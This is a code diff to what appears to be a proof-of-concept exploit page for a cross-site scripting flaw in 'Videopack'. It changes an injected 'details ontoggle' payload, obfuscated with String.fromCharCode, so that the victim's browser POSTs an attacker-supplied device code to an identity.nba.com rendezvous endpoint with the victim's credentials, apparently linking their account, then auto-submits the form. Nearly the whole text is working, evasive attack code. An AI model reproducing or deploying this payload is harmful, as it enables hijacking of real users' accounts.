@@ -46,11 +46,15 @@
     return `String.fromCharCode(${Array.from(value, character => character.charCodeAt(0)).join(",")})`;
   }
 
-  function exploitPayload(code, deviceId) {
+  function exploitPayload(code) {
     const identityEndpoint = charCodeExpression("https://identity.nba.com/api/v1/rendezvous");
-    const beaconName = charCodeExpression("sendBeacon");
+    const fetchName = charCodeExpression("fetch");
+    const post = charCodeExpression("POST");
+    const include = charCodeExpression("include");
+    const contentType = charCodeExpression("Content-Type");
+    const textPlain = charCodeExpression("text/plain");
     const requestBody = charCodeExpression(JSON.stringify({ code }));
-    const handler = `navigator[${beaconName}](${identityEndpoint},${requestBody});top.history.back()`;
+    const handler = `top[${fetchName}](${identityEndpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:${requestBody}}).finally(top.history.back.bind(top.history))`;
     return `250\"><details open ontoggle=${handler}>`;
   }
 
@@ -137,7 +141,7 @@
 
     status.textContent = "Device code created. Triggering Videopack XSS…";
     sessionStorage.setItem(SESSION_KEY, JSON.stringify(session));
-    document.getElementById("galleryThumb").value = exploitPayload(session.code, session.deviceId);
+    document.getElementById("galleryThumb").value = exploitPayload(session.code);
     document.getElementById("poc").submit();
   }
 
